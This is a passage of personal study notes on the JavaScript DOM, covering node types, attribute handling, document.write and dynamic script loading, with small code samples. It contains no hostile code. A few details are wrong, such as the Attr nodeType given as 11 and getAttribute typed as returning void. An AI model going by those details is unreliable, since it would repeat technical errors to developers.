<ul><li>can be set to subdomain (suffix)</li> <li>cross-domain security restrictions: Pages from different subdomains can’t communicate with one another via JavaScript</li> <li>By setting <code>document.domain</code> in each page to the same value, the pages can access JavaScript objects from each other</li></ul></li> <li><code>Document.referrer</code>: the URL of the page that linked to this page</li> <li><code>Document.readyState</code></li> <li><code>Document.characterSet</code></li> <li><code>Document.contentType</code></li> <li><code>Document.dir</code></li> <li><code>Document.lastModified</code></li></ul></li> <li><p><code>HTMLCollection</code></p> <ul><li>somewhat similar to <code>NodeList</code></li> <li>represents a generic collection (array-like object similar to <code>arguments</code>) of elements (in document order)</li> <li>always live; it is automatically updated when the underlying document is changed</li> <li><code>HTMLCollection.item(index: number)</code> or bracket notation
<ul><li>returns <code>null</code> if the index is out of range</li></ul></li> <li><code>HTMLCollection.namedItem(name: string)</code>, or bracket notation<div class="language-javascript extra-class"><pre class="language-javascript"><code><span class="token keyword">var</span> images <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementsByTagName</span><span class="token punctuation">(</span><span class="token string">&quot;img&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> myImage <span class="token operator">=</span> images<span class="token punctuation">.</span><span class="token function">namedItem</span><span class="token punctuation">(</span><span class="token string">&quot;myImage&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> myImage <span class="token operator">=</span> images<span class="token punctuation">[</span><span class="token string">&quot;myImage&quot;</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
</code></pre></div>return the first if multiple</li></ul></li> <li><p>Locating Elements</p> <ul><li><code>document.getElementById(elementId)</code> <ul><li>IE7 and earlier have quirks</li></ul></li> <li><code>document.getElementsByTagName(tagName): HTMLCollection</code> <ul><li>can be used on an <code>Element</code></li> <li>case-insensitive for HTML, case-sensitive for XML and XHTML</li> <li>return: a <code>NodeList</code> containing zero or more elements</li> <li>wildcard: <code>&quot;*&quot;</code>: <code>document.getElementsByTagName(&quot;*&quot;)</code></li></ul></li> <li><code>document.getElementsByName(elementName)</code> <ul><li>return: <code>NodeList</code> of all elements that have a given <code>name</code> attribute</li></ul></li></ul></li> <li><p>Special Collections</p> <ul><li>Each of these collections is an <code>HTMLCollection</code> object and provides faster access to common parts of the document</li> <li><code>document.anchors</code> — Contains all <code>&lt;a&gt;</code> elements with a name attribute in the document</li> <li><code>document.applets</code> — Contains all <code>&lt;applet&gt;</code> elements in the document. This collection is deprecated, because the <code>&lt;applet&gt;</code> element is no longer recommended for use</li> <li><code>document.forms</code> — Contains all <code>&lt;form&gt;</code> elements in the document. The same as <code>document.getElementsByTagName(&quot;form&quot;)</code></li> <li><code>document.images</code> — Contains all <code>&lt;img&gt;</code> elements in the document. The same as document.getElementsByTagName(“img”) .</li> <li><code>document.links</code> — Contains all <code>&lt;a&gt;</code> elements with an href attribute in the document</li> <li><code>Document.embeds</code> — <code>&lt;embed&gt;</code> (and <code>&lt;object&gt;</code> ???)</li> <li><code>Document.scripts</code></li></ul></li> <li><p>Page Visibility</p> <ul><li>useful for saving resources and improving performance by letting a page avoid performing unnecessary tasks when the document isn't visible
<ul><li>Tabs which are playing audio are considered foreground</li></ul></li> <li>user agent policies
<ul><li>Most browsers stop sending <code>requestAnimationFrame()</code> callbacks to background tabs or hidden <code>&lt;iframe&gt;</code>s</li> <li>Timers such as <code>setTimeout()</code> are throttled in background/inactive tabs to help improve performance</li> <li>Tabs running code that's using real-time network connections (WebSockets and WebRTC) go unthrottled</li> <li>IndexedDB processes are also left unthrottled in order to avoid timeouts</li></ul></li> <li><code>Document.hidden: boolean</code> Read only — indicating if the page is hidden from view. This may mean the page is in a background tab or that the browser is minimized</li> <li><code>Document.visibilityState: VisibilityState</code> <ul><li><code>'visible'</code> — The page content may be at least partially visible. In practice this means that the page is the foreground tab of a non-minimized window</li> <li><code>'hidden'</code> — The page content is not visible to the user. In practice this means that the document is either a background tab or part of a minimized window, or the OS screen lock is active</li> <li><code>'prerender'</code> — The page content is being pre-rendered and is not visible to the user (considered hidden for purposes of document.hidden). The document may start in this state, but will never transition to it from another value. Note: browser support is optional</li></ul></li> <li><code>visibilitychange</code> event
<ul><li>interface: <code>Event</code></li> <li><code>bubbles</code>: <code>true</code></li> <li><code>cancelable</code>: <code>false</code></li> <li><code>target</code>: <code>Document</code></li> <li>default action: None</li></ul></li></ul></li> <li><p>DOM Conformance Detection</p> <ul><li>The <code>document.implementation</code> property is an object containing information and functionality tied directly to the browser’s implementation of the DOM</li> <li>DOM Level 1 specifies only one method, <code>hasFeature(feature, version)</code> <ul><li><a href="https://www.w3.org/TR/DOM-Level-2-Core/introduction.html#ID-Conformance-h2" target="_blank" rel="noopener noreferrer">list<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li> <li>the implementer gets to decide</li> <li>a good idea to use capability detection in addition</li></ul></li> <li>DOM 2
<ul><li><code>DOMImplementation.createHTMLDocument(title?: string): Document</code> <ul><li>create a complete HTML document, including the <code>&lt;html&gt;</code>, <code>&lt;head&gt;</code>, <code>&lt;title&gt;</code> (optional), and <code>&lt;body&gt;</code> elements</li></ul></li> <li><code>DOMImplementation.createDocumentType(qualifiedName, publicId, systemId): DocumentType</code> <ul><li>useful only when creating new documents</li> <li>An existing document’s doctype cannot be changed</li></ul></li> <li><code>DOMImplementation.createDocument(namespaceURI, qualifiedName, doctype: DocumentType): XMLDocument</code> <ul><li>with only qualifiedName tag, typically <code>&quot;root&quot;</code> for <code>&lt;root&gt;</code></li></ul></li></ul></li></ul></li> <li><p>Document Writing</p> <ul><li><code>document.write(content): void</code><div class="language-html extra-class"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span>document.write() Example<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span>The current date and time is:
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>text/javascript<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">
            document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">&quot; &lt; strong &gt; &quot;</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">&quot; &lt; /strong&gt;&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>text/javascript<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">
        document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">&quot;&lt;script type=\&quot;text/javascript\&quot; src=\&quot;file.js\&quot;&gt;&quot;</span> <span class="token operator">+</span> <span class="token string">&quot;&lt;\/script&gt;&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span>
</code></pre></div><ul><li>dynamic content and dynamically include external resources such as JavaScript files</li> <li>when called after the page has been completely loaded (<code>window.onload</code>), the content overwrites the entire page
<ul><li><code>document.open()</code> is automatically called</li></ul></li> <li>Document writing is not supported in strict XHTML documents</li></ul></li> <li><code>document.writeln(content): void</code>: same as the above, but appends a new-line character (<code>\n</code>) to the end of the string</li> <li><code>document.open(): Document</code> and <code>document.close(): void</code> <ul><li>open and close the web page output stream</li> <li>If a document exists in the target, <code>open()</code> method clears it</li></ul></li></ul></li> <li><p>DOM 2 changes</p> <ul><li><code>Document.importNode&lt;T extends Node&gt;(importedNode: T, deep: boolean): T</code> <ul><li>If a method such as <code>appendChild()</code> is called and a node with a different <code>ownerDocument</code> is passed in, an error will occur</li> <li>returns a new version of the node that is owned by the appropriate document</li> <li>deep argument: similar to <code>Node.cloneNode()</code>, whether or not to import the descendants</li></ul></li> <li><code>Document.defaultView: Window</code> <ul><li>returns the <code>window</code> object associated with a document, or <code>null</code> if none is available</li> <li>IE8 and earlier: <code>parentWindow</code><div class="language-javascript extra-class"><pre class="language-javascript"><code><span class="token keyword">var</span> parentWindow <span class="token operator">=</span> document<span class="token punctuation">.</span>defaultView <span class="token operator">||</span> document<span class="token punctuation">.</span>parentWindow<span class="token punctuation">;</span>
</code></pre></div></li></ul></li></ul></li></ol> <h4 id="the-element-type"><a href="#the-element-type" class="header-anchor">#</a> The Element Type</h4> <ol><li><p>An Element node</p> <ul><li><code>nodeType</code> is 1</li> <li><code>nodeName</code> is the element’s tag name
<ul><li>better use <code>tagName</code> for clarity</li> <li>convert case: in HTML, the tag name is always represented in all uppercase; when used with XML (including XHTML), the tag name always matches the case of the source code</li></ul></li> <li><code>nodeValue</code> is null</li> <li><code>parentNode</code> may be a <code>Document</code> or <code>Element</code></li> <li>Child nodes may be <code>Element</code>, <code>Text</code>, <code>Comment</code>, <code>ProcessingInstruction</code>, <code>CDATASection</code>, or <code>EntityReference</code></li> <li>inherits: <code>EventTarget</code> ← <code>Node</code> ← <code>Element</code> ← <code>HTMLElement</code></li></ul></li> <li><p>HTML Elements: the <code>HTMLElement</code> type or subtype, inherits directly from <code>Element</code> and adds several properties, editable</p> <div class="language-html extra-class"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>myDiv<span class="token punctuation">&quot;</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>bd<span class="token punctuation">&quot;</span></span> <span class="token attr-name">title</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>Body text<span class="token punctuation">&quot;</span></span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>en<span class="token punctuation">&quot;</span></span> <span class="token attr-name">dir</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>ltr<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>
</code></pre></div><ul><li><code>id</code> — A unique identifier for the element in the document</li> <li><code>title</code> — Additional information about the element, typically represented as a tooltip</li> <li><code>lang</code> — The language code for the contents of the element (rarely used)</li> <li><code>dir</code> — The direction of the language, &quot;ltr&quot; (left-to-right) or &quot;rtl&quot; (right-to-left); also rarely used</li> <li><code>className</code> — The equivalent of the class attribute, which is used to specify CSS classes on an element
<ul><li><code>class</code> is a reserved keyword</li></ul></li> <li><a href="https://developer.mozilla.org/en-US/docs/Web/API/HTMLElement" target="_blank" rel="noopener noreferrer">subtypes<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a>, Related pages for HTML DOM in the left side panel
<ul><li>(DOM 2) <code>HTMLIFrameElement.contentDocument: Document</code><div class="language-javascript extra-class"><pre class="language-javascript"><code>document<span class="token punctuation">.</span><span class="token function">getElementsByTagName</span><span class="token punctuation">(</span><span class="token string">&quot;iframe&quot;</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>contentDocument<span class="token punctuation">;</span>
<span class="token comment">//won’t work in IE &lt; 8</span>
</code></pre></div>access limited based on cross-domain security restrictions</li></ul></li></ul></li> <li><p>Manipulating Attributes: see also <a href="#the-attr-type">The <code>Attr</code> Type</a></p> <ul><li>work on any attribute, including those defined as properties</li> <li>All all recognized (non-custom) attributes on an element are also accessible as properties
<ul><li>not only the five properties defined on <code>HTMLElement</code></li></ul></li> <li>attribute names are case-insensitive</li> <li>according to HTML5, custom attributes should be prepended with <code>data-</code> in order to validate</li> <li><code>getAttribute(qualifiedName): void</code> method:
<ul><li>has differences between access via a property
<ul><li>IE7 and earlier always return the same value</li></ul></li> <li>developers tend to forego <code>getAttribute()</code></li> <li><code>style</code> attribute
<ul><li>When accessed via <code>getAttribute()</code>, the style attribute contains CSS text</li> <li>while accessing it via a property that returns an object</li></ul></li> <li>event-handler attributes
<ul><li>code string is returned when using <code>getAttribute()</code></li> <li>when property is accessed, it returns a JavaScript function (or <code>null</code> if the attribute isn’t specified)</li></ul></li></ul></li> <li><code>setAttribute(qualifiedName, value): void</code> method
<ul><li>works with both HTML attributes and custom attributes in the same way</li> <li>Attribute names get normalized to lowercase</li> <li>adding a custom property to a DOM element, does not automatically make it an attribute of the element<div class="language-javascript extra-class"><pre class="language-javascript"><code>div<span class="token punctuation">.</span>myColor <span class="token operator">=</span> <span class="token string">&quot;red&quot;</span><span class="token punctuation">;</span>
<span class="token function">alert</span><span class="token punctuation">(</span>div<span class="token punctuation">.</span><span class="token function">getAttribute</span><span class="token punctuation">(</span><span class="token string">&quot;myColor&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//null (except in Internet Explorer)</span>
</code></pre></div>IE7 and earlier had some abnormal behavior</li></ul></li> <li><code>removeAttribute(qualifiedName): void</code> <ul><li>completely removes the attribute from the element</li> <li>IE6 and earlier does not support</li></ul></li> <li>(DOM 2) <code>hasAttribute(name: string): boolean</code></li></ul></li> <li><p>The <code>attributes</code> Property</p> <ul><li>The <code>attributes</code> property contains a <code>NamedNodeMap</code>, which is a “live” collection of <code>Attr</code> nodes similar to a <code>NodeList</code></li> <li>Each node in the <code>attributes</code> property is a node whose <code>nodeName</code> is the attribute name and whose <code>nodeValue</code> is the attribute’s value</li> <li>powerful when iterate over the attributes on an element
<ul><li>Browsers differ on the order in which they return attributes</li> <li>IE7 and earlier return all possible attributes on an HTML element, even if they aren’t specified
<ul><li><code>Attr.specified: boolean</code> property for check</li></ul></li></ul></li> <li>A <code>NamedNodeMap</code> object has the following methods
<ul><li>not preferred than methods above</li> <li><code>getNamedItem(name)</code> — Returns the node whose <code>nodeName</code> property is equal to name
<ul><li>also bracket notation</li> <li>same as <code>Element.getAttributeNode(name): Attr</code></li></ul></li> <li><code>removeNamedItem(name)</code> — Removes the node whose <code>nodeName</code> property is equal to name from the list
<ul><li>functions the same as the <code>Element.removeAttribute()</code> method</li></ul></li> <li><code>setNamedItem(node)</code> — Adds the node to the list, indexing it by its <code>nodeName</code> property</li> <li><code>item(pos)</code> — Returns the node in the numerical position pos
<ul><li>also bracket notation</li></ul></li></ul></li></ul></li> <li><p>Creating Elements</p> <ul><li><code>document.createElement(qualifiedName): HTMLElementTagNameMap[K]</code> method
<ul><li>In HTML documents, the tag name is case-insensitive, whereas it is case-sensitive in XML documents (including XHTML)</li> <li>sets its <code>ownerDocument</code> property</li> <li>The element can be added to the document tree using methods for manipulating nodes</li> <li>quirks in IE7 and earlier</li></ul></li></ul></li> <li><p>Element Children</p> <ul><li>To get child nodes and other descendants with a particular tag name, elements also support the <code>getElementsByTagName()</code> method</li> <li>the search is rooted on the element</li></ul></li></ol> <h4 id="the-text-type"><a href="#the-text-type" class="header-anchor">#</a> The Text Type</h4> <ol><li><p><code>Text</code> node type</p> <ul><li>plain text that is interpreted literally and may contain escaped HTML characters but no HTML code</li> <li><code>nodeType</code> is 3</li> <li><code>nodeName</code> is <code>&quot;#text&quot;</code></li> <li><code>nodeValue</code> is text contained in the node
<ul><li>also the <code>data</code> property</li></ul></li> <li><code>parentNode</code> is an <code>Element</code></li> <li>Child nodes are not supported</li> <li><code>length</code> property: the same as using <code>nodeValue.length</code> or <code>data.length</code></li></ul></li> <li><p>methods for manipulation of the text in the node</p> <ul><li><code>appendData(text): void</code> — Appends text to the end of the node</li> <li><code>deleteData(offset, count): void</code> — Deletes count number of characters starting at position offset</li> <li><code>insertData(offset, text): void</code> — Inserts text at position offset</li> <li><code>replaceData(offset, count, text): void</code> — Replaces the text starting at offset through offset + count with text</li> <li><code>splitText(offset)</code> — Splits the text node into two text nodes separated at position offset
<ul><li>return the second string starting at offset</li></ul></li> <li><code>substringData(offset, count): string</code> — Extracts a string from the text beginning at position offset and continuing until offset + count</li></ul></li> <li><p><code>Text</code> node in HTML</p> <div class="language-html extra-class"><pre class="language-html"><code><span class="token comment">&lt;!-- no content, so no text node --&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>
<span class="token comment">&lt;!-- white space content, so one text node --&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">&gt;</span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>
<span class="token comment">&lt;!-- content, so one text node --&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">&gt;</span></span>Hello World!<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>
</code></pre></div><p>when changing the value, the string is HTML- or XML-encoded</p></li> <li><p>Creating Text Nodes and sibling text nodes</p> <ul><li><code>document.createTextNode(data)</code> method</li> <li>the text will be HTML- or XML-encoded</li> <li><code>ownerDocument</code> property is set</li> <li>when multiple text nodes, they are displayed without any space between them</li> <li>When the browser parses a document, it will never create sibling text node</li> <li><code>Node.normalize(): void</code>: call on parent nodes to merge text nodes</li></ul></li></ol> <h4 id="type-of-minimal-use"><a href="#type-of-minimal-use" class="header-anchor">#</a> Type of Minimal Use</h4> <h5 id="the-comment-type"><a href="#the-comment-type" class="header-anchor">#</a> The Comment Type</h5> <ol><li><p>Comments are represented in the DOM by the <code>Comment</code> type</p> <ul><li>similar to <code>Text</code> node type</li> <li><code>nodeType</code> is 8</li> <li><code>nodeName</code> is <code>&quot;#comment&quot;</code></li> <li><code>nodeValue</code> is the content of the comment
<ul><li>also <code>data</code> property</li></ul></li> <li><code>parentNode</code> is a <code>Document</code> or <code>Element</code></li> <li>Child nodes are not supported</li> <li>browsers don’t recognize comments that exist after the closing <code>&lt;/html&gt;</code> tag</li></ul></li> <li><p>methods: all of the same string-manipulation methods as <code>Text</code> except <code>splitText()</code></p></li> <li><p>create comment nodes</p> <ul><li><code>document.createComment(data): Comment</code> method</li></ul></li></ol> <h5 id="the-cdatasection-type"><a href="#the-cdatasection-type" class="header-anchor">#</a> The CDATASection Type</h5> <ol><li><p>CDATA: character data</p> <ul><li>CDATA sections are specific to XML-based documents and are represented by the <code>CDATASection</code> type</li> <li>Even in valid XHTML pages, the browsers don’t properly support embedded CDATA sections</li> <li>inherits from the base <code>Text</code> type</li> <li><code>nodeType</code> is 4</li> <li><code>nodeName</code> is <code>&quot;#cdata-section&quot;</code></li> <li><code>nodeValue</code> is the contents of the CDATA section</li> <li><code>parentNode</code> is a Document or Element</li> <li>Child nodes are not supported</li></ul></li> <li><p>manipulating methods</p> <ul><li>all of the same string manipulation methods as <code>Text</code> except for <code>splitText()</code></li></ul></li></ol> <h5 id="the-documenttype-type"><a href="#the-documenttype-type" class="header-anchor">#</a> The DocumentType Type</h5> <ol><li><p>The <code>DocumentType</code> type</p> <ul><li><code>nodeType</code> is 10</li> <li><code>nodeName</code> is the name of the doctype
<ul><li>also <code>name</code> property</li></ul></li> <li><code>nodeValue</code> is <code>null</code></li> <li><code>parentNode</code> is a <code>Document</code></li> <li>Child nodes are not supported</li> <li>they are created only as the document’s code is being parsed
<ul><li>stored in <code>document.doctype</code></li></ul></li></ul></li> <li><p>DOM 2</p> <div class="language-html extra-class"><pre class="language-html"><code><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span> <span class="token name">PUBLIC</span> <span class="token string">&quot;-//W3C//DTD XHTML 1.0 Strict//EN&quot;</span>
<span class="token string">&quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd&quot;</span>
<span class="token punctuation">[</span><span class="token punctuation">&lt;!</span><span class="token name">ELEMENT</span> <span class="token name">name</span> <span class="token name">(#PCDATA)</span>&gt;<span class="token punctuation">]</span> <span class="token punctuation">&gt;</span></span>
</code></pre></div><ul><li><code>DocumentType.publicId: string</code>: <code>&quot;-//W3C//DTD XHTML 1.0 Strict//EN&quot;</code></li> <li><code>DocumentType.systemId: string</code>: <code>&quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd&quot;</code></li> <li><code>DocumentType.internalSubset: string</code>: <code>&quot;&lt;!ELEMENT name (#PCDATA)&gt;&quot;</code></li></ul></li></ol> <h4 id="the-documentfragment-type"><a href="#the-documentfragment-type" class="header-anchor">#</a> The DocumentFragment Type</h4> <ol><li><p>The <code>DocumentFragment</code> Type</p> <ul><li>the only one that has no representation in markup
<ul><li>cannot be added to a document directly</li> <li>acts as a repository for other nodes that may need to be added to the document</li></ul></li> <li>The DOM defines a document fragment as a “lightweight” document, capable of containing and manipulating nodes without all of the additional overhead of a complete document</li> <li><code>nodeType</code> is 11</li> <li><code>nodeName</code> is <code>&quot;#document-fragment&quot;</code></li> <li><code>nodeValue</code> is <code>null</code></li> <li><code>parentNode</code> is <code>null</code></li> <li>Child nodes may be <code>Element</code>, <code>ProcessingInstruction</code>, <code>Comment</code>, <code>Text</code>, <code>CDATASection</code>, or <code>EntityReference</code></li></ul></li> <li><p>use <code>DocumentFragment</code></p> <ul><li>create: <code>document.createDocumentFragment(): DocumentFragment</code></li> <li>If a node from the document is added to a document fragment, that node is removed from the document tree</li> <li>add to document: <code>document.appendChild(DocumentFragment)</code> and <code>document.insertBefore(DocumentFragment)</code> <ul><li>all of the document fragment’s child nodes are added in that spot</li> <li>the document fragment itself is never added to the document tree</li></ul></li></ul></li></ol> <h4 id="the-attr-type"><a href="#the-attr-type" class="header-anchor">#</a> The Attr Type</h4> <ol><li><p>The <code>Attr</code> Type</p> <ul><li>Element attributes are represented by the <code>Attr</code> type in the DOM</li> <li>Technically, attributes are nodes that exist in an element’s <code>attributes</code> property</li> <li>Even though they are nodes, attributes are not considered part of the DOM document tree</li> <li><code>nodeType</code> is 11</li> <li><code>nodeName</code> is the attribute name
<ul><li>also <code>name</code></li></ul></li> <li><code>nodeValue</code> is the attribute value
<ul><li>also <code>value</code></li></ul></li> <li><code>parentNode</code> is <code>null</code></li> <li>Child nodes are not supported in HTML</li> <li>Child nodes may be <code>Text</code> or <code>EntityReference</code> in XML</li></ul></li> <li><p>add an attribute: see also <a href="#the-element-type">The <code>Element</code> Type</a></p> <div class="language-javascript extra-class"><pre class="language-javascript"><code><span class="token keyword">var</span> attr <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createAttribute</span><span class="token punctuation">(</span><span class="token string">&quot;align&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
attr<span class="token punctuation">.</span>value <span class="token operator">=</span> <span class="token string">&quot;left&quot;</span><span class="token punctuation">;</span>
element<span class="token punctuation">.</span><span class="token function">setAttributeNode</span><span class="token punctuation">(</span>attr<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">alert</span><span class="token punctuation">(</span>element<span class="token punctuation">.</span>attributes<span class="token punctuation">[</span><span class="token string">&quot;align&quot;</span><span class="token punctuation">]</span><span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//&quot;left&quot;</span>
<span class="token function">alert</span><span class="token punctuation">(</span>element<span class="token punctuation">.</span><span class="token function">getAttributeNode</span><span class="token punctuation">(</span><span class="token string">&quot;align&quot;</span><span class="token punctuation">)</span><span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//&quot;left&quot;</span>
<span class="token function">alert</span><span class="token punctuation">(</span>element<span class="token punctuation">.</span><span class="token function">getAttribute</span><span class="token punctuation">(</span><span class="token string">&quot;align&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//&quot;left&quot;</span>
</code></pre></div><p>not preferred, not a good reason to access attribute nodes directly</p></li></ol> <h4 id="working-with-the-dom"><a href="#working-with-the-dom" class="header-anchor">#</a> Working With The DOM</h4> <ol><li><p>Dynamic Scripts</p> <ul><li>The <code>&lt;script&gt;</code> element: <code>src</code> or inline<div class="language-javascript extra-class"><pre class="language-javascript"><code><span class="token keyword">var</span> script <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">&quot;script&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
script<span class="token punctuation">.</span>type <span class="token operator">=</span> <span class="token string">&quot;text/javascript&quot;</span><span class="token punctuation">;</span>
script<span class="token punctuation">.</span>src <span class="token operator">=</span> <span class="token string">&quot;client.js&quot;</span><span class="token punctuation">;</span>
document<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>script<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// could be added to the &lt;head&gt; element as well</span>
<span class="token comment">// though this has the same effect</span>
</code></pre></div>inline JavaScript code: essentially the same as passing the string into <code>eval()</code> in the global scope<div class="language-javascript extra-class"><pre class="language-javascript"><code><span class="token keyword">var</span> script <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">&quot;script&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
script<span class="token punctuation">.</span>type <span class="token operator">=</span> <span class="token string">&quot;text/javascript&quot;</span><span class="token punctuation">;</span>
script<span class="token punctuation">.</span>text <span class="token operator">=</span> <span class="token string">&quot;function sayHi(){alert('hi');}&quot;</span><span class="token punctuation">;</span>
<span class="token comment">// also createTextNode and appendChild</span>
document<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>script<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre></div></li> <li>generalized into the following function<div class="language-javascript extra-class"><pre class="language-javascript"><code><span class="token keyword">function</span> <span class="token function">loadError</span><span class="token punctuation">(</span><span class="token parameter">oError</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">URIError</span><span class="token punctuation">(</span><span class="token string">&quot;The script &quot;</span> <span class="token operator">+</span> oError<span class="token punctuation">.</span>target<span class="token punctuation">.</span>src <span class="token operator">+</span> <span class="token string">&quot; didn't load correctly.&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">function</span> <span class="token function">prefixScript</span><span class="token punctuation">(</span><span class="token parameter">url<span class="token punctuation">,</span> onloadFunction</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">var</span> newScript <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">&quot;script&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
